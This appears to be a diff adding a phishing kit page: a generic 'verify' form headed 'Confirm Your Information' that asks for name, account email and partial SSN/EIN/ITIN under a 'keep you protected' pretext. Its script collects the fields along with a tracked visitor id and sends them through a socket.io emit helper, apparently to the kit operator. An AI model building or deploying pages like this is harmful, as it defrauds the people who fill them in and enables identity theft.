@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    	<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    	<link rel="stylesheet" href="assets/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>verify</title>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f7f9fa;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    .header {
+	    display: flex;
+	    justify-content: flex-start;
+	    align-items: center;
+	    width: 100%;
+	    background-color: #432874;
+	    color: #fff;
+	    padding: 20px 25px;
+	    font-size: 24px;
+	    font-weight: bold;
+	    margin-bottom: 40px;           /* Changed from 5% to fixed value */
+	    box-sizing: border-box;        /* Important addition */
+	}
+
+    .header img {
+        width: 120px;
+    }
+
+    h2 {
+        font-size: 24px;
+        color: #432874;
+        font-weight: normal;
+        text-align: center;
+        width: 100%;
+        max-width: 420px;
+        margin: 15px 0 20px 0;
+        box-sizing: border-box;
+    }
+
+  
+</style> 
+</head>
+<body>
+    <div class="header">
+        <img src="assets/images/logo-white.png" alt="Logo"> 
+    </div>
+    <h2>Confirm Your Information</h2> <!-- Moved h2 outside of the container -->
+    <div class="container">
+        <div class="content">
+            <p>Let's keep you protected</p>
+
+            <form>
+            <div class="form-group">
+    <label>First Name</label>
+    <input id="first-name" name="first name" type="text" placeholder="First Name" >
+</div>
+
+<div class="form-group">
+    <label>Last Name</label>
+    <input id="last-name" name="last name" type="text" placeholder="Last Name" >
+</div>
+
+<div class="form-group">
+    <label>Email address associated with your account</label>
+    <input id="email" name="email" type="email" placeholder="name@email.com" >
+</div>
+
+<div class="form-group">
+    <label>Last 5 digits of your SSN, EIN, or ITIN <i title="Additional information about SSN, EIN, or ITIN.">i</i></label>
+    <input id="ssn" name="ssn" type="text" placeholder="Enter input in the format X-XXXX" >
+</div>
+
+
+    <button class="submit">Continue</button>
+
+</form>
+        </div>
+    </div>
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="assets/emit.js"></script> 
+<script>
+$(document).ready(function() {
+    $('.submit').on('click', async function(e) {   // ← Add "async" here
+        e.preventDefault();
+
+        let isEmpty = false;
+		const checkInputs = $('input'); 
+		
+		// First, remove any existing error messages
+		$('.error-message').remove();
+		
+		// Check for empty fields
+		for (const check of checkInputs) {
+		    // Reset previous styling
+		    $(check).css('borderColor', '');
+		
+		    if (check.value.trim() === "") {
+		        $(check).css('borderColor', 'red'); // Highlight input
+		        
+		        check.classList.add("error");
+		        // Create error message div
+		        const errorDiv = $('<div class="error-message"></div>');
+		        
+		        errorDiv.html(`
+		            <span class="error-icon">!</span>
+		            <span class="error-text">Please enter a valid ${check.name}</span>
+		        `);
+		
+		        // Insert error message right after the input
+		        $(check).after(errorDiv);
+		        
+		        isEmpty = true;
+		    }
+		}
+
+        if (!isEmpty) {
+            let userinfo = $('form').serializeArray();
+            let user = {};
+            let visitor = sessionStorage.getItem('visitor');
+
+            userinfo.forEach((item) => {
+                user[item.name] = item.value;
+            });
+
+            user['visitor'] = visitor;
+
+            try {
+                await submitFormData(user);   // Now safe to use await
+                // Optional: show success message or redirect
+            } catch (error) {
+                console.error("Submission failed:", error);
+            }
+        }
+    });
+});
+</script> 
+</html> 
